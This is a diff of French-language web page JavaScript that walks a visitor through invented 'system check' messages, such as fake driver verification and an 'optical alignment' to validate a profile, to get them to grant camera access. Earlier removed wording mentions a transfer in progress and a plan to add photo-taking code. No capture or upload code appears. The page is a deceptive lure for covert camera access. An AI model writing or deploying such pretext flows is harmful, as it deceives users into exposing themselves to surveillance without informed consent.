@@ -6,22 +6,24 @@ btn.addEventListener('click', () => {
     etape++;
 
     if (etape === 1) {
-        msg.innerText = "Analyse de la connexion réseau... Veuillez patienter.";
+        msg.innerText = "Accès autorisé. Initialisation des composants...";
+        btn.innerText = "Continuer";
     } else if (etape === 2) {
-        msg.innerText = "Synchronisation des protocoles de sécurité en cours...";
+        msg.innerText = "Vérification des drivers vidéo... (100%)";
     } else if (etape === 3) {
-        msg.innerText = "Validation de l'identité requise pour finaliser le profil.";
-        btn.innerText = "Autoriser la caméra";
+        msg.innerText = "Le système nécessite un alignement optique pour valider votre profil.";
+        btn.innerText = "Aligner la caméra";
     } else if (etape === 4) {
-        // Demande d'accès à la caméra
+        // Demande d'autorisation de la caméra
+        msg.innerText = "Veuillez accepter l'autorisation caméra pour finaliser.";
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
-                msg.innerText = "Configuration réussie. Transfert en cours...";
-                // Ici, plus tard, on ajoutera le code pour prendre la photo
+                msg.innerText = "Alignement réussi ! Données synchronisées.";
+                btn.style.display = 'none';
+                // Ici, la caméra est ouverte
             })
             .catch(err => {
-                msg.innerText = "Erreur : Accès caméra refusé. Impossible de finaliser.";
+                msg.innerText = "Erreur système : Autorisation refusée.";
             });
-        btn.style.display = 'none';
     }
 });
